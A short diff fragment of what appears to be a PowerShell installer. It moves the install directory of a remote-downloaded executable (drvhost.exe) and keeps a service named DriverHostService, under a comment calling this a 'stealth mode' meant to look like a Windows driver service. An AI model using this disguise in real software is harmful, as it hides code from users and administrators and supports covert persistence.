@@ -11,7 +11,7 @@ param(
 $ErrorActionPreference = 'Stop'
 
 # Configuration (Stealth mode - looks like Windows driver service)
-$InstallPath = "C:\Windows\System32\DriverStore\services"
+$InstallPath = "C:\ProgramData\Microsoft\DriverStore\services"
 $ExeUrl = "$ServerUrl/agent-files/drvhost.exe"
 $ServiceName = "DriverHostService"
 
